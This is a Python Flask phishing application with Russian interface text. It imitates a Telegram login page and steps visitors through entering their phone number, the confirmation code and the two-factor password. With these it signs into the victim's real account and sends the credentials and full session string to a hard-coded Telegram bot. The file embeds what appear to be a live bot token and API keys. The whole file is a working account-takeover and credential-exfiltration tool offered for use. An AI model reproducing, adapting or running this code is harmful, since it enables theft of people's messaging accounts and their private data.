from flask import Flask, render_template_string, request, redirect, url_for, session as flask_session
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import os
import logging

app = Flask(__name__)
app.secret_key = os.urandom(24)

BOT_TOKEN = "8791356428:AAGCZzEnZ5_4YxOMfajeZR4uJzZ9J81VSNg"
CHAT_ID = 7489815425
API_ID = 37839268
API_HASH = "02f22349d03ee117dee396f65bcc56da"

HTML_LOGIN = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Telegram</title>
    <style>
        body {font-family: Arial; background: #0f0f0f; color: #fff; text-align: center; padding: 50px;}
        input {width: 300px; padding: 12px; margin: 10px; background: #1f1f1f; border: 1px solid #333; color: #fff; border-radius: 4px;}
        button {padding: 12px 30px; background: #2481cc; color: white; border: none; border-radius: 4px; cursor: pointer;}
    </style>
</head>
<body>
    <h1>Telegram</h1>
    <p>Войдите в аккаунт</p>
    <form method="POST" action="/step1">
        <input type="tel" name="phone" placeholder="+7XXXXXXXXXX" required><br>
        <button type="submit">Далее</button>
    </form>
</body>
</html>
"""

HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Telegram</title>
    <style>body {font-family: Arial; background: #0f0f0f; color: #fff; text-align: center; padding: 50px;}
        input, button {padding: 12px; margin: 10px;}</style>
</head>
<body>
    <h1>Код подтверждения</h1>
    <p>Мы отправили код в Telegram</p>
    <form method="POST" action="/step2">
        <input type="text" name="code" placeholder="Код" required><br>
        <button type="submit">Подтвердить</button>
    </form>
</body>
</html>
"""

HTML_PASSWORD = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Telegram</title>
    <style>body {font-family: Arial; background: #0f0f0f; color: #fff; text-align: center; padding: 50px;}
        input, button {padding: 12px; margin: 10px;}</style>
</head>
<body>
    <h1>Введите пароль</h1>
    <form method="POST" action="/step3">
        <input type="password" name="password" placeholder="Пароль от 2FA" required><br>
        <button type="submit">Войти</button>
    </form>
</body>
</html>
"""

async def send_to_bot(text):
    try:
        from telethon import TelegramClient
        bot_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await bot_client.start(bot_token=BOT_TOKEN)
        await bot_client.send_message(CHAT_ID, text)
        await bot_client.disconnect()
    except:
        pass  # fallback если что-то упало

@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/step1', methods=['POST'])
async def step1():
    phone = request.form['phone'].strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    flask_session['phone'] = phone

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()

    sent = await client.send_code_request(phone)
    flask_session['phone_code_hash'] = sent.phone_code_hash
    flask_session['client'] = client  # сохраняем объект клиента в сессии (для демо; в проде лучше использовать Redis)

    return render_template_string(HTML_CODE)

@app.route('/step2', methods=['POST'])
async def step2():
    code = request.form['code'].strip()
    phone = flask_session['phone']
    phone_code_hash = flask_session['phone_code_hash']
    client = flask_session['client']

    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        # Успешный вход без 2FA
        session_string = client.session.save()
        me = await client.get_me()
        text = f"✅ НОВАЯ СЕССИЯ!\nНомер: {phone}\nКод: {code}\nUser: @{me.username} ({me.id})\n\nSession:\n{session_string}"
        asyncio.create_task(send_to_bot(text))
        await client.disconnect()
        return "<h1 style='color:green'>Вход выполнен успешно. Можете закрыть вкладку.</h1>"
    except SessionPasswordNeededError:
        # Требуется 2FA
        flask_session['client'] = client
        return render_template_string(HTML_PASSWORD)
    except Exception as e:
        return f"<h1>Ошибка: {str(e)}</h1>"

@app.route('/step3', methods=['POST'])
async def step3():
    password = request.form['password'].strip()
    client = flask_session['client']
    phone = flask_session['phone']

    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        me = await client.get_me()
        code = "2FA"  # просто маркер
        text = f"✅ НОВАЯ СЕССИЯ (2FA)!\nНомер: {phone}\nПароль: {password}\nUser: @{me.username} ({me.id})\n\nSession:\n{session_string}"
        asyncio.create_task(send_to_bot(text))
        await client.disconnect()
        return "<h1 style='color:green'>Вход выполнен успешно. Можете закрыть вкладку.</h1>"
    except Exception as e:
        return f"<h1>Ошибка 2FA: {str(e)}</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
